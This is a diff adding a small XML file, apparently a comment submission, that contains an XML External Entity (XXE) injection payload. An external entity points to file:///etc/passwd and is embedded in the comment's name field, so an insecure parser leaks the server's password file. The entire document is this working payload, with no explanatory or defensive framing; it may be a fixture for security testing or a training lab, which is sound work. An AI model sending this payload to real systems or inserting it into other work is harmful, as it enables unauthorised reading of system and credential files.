@@ -1,0 +1,9 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE data [
+   <!ELEMENT data ANY >
+   <!ENTITY name SYSTEM "file:///etc/passwd" >]>
+<comment>
+  <name>&name;</name>
+  <author>Barry Clad</author>
+  <com>Lol</com>
+</comment>
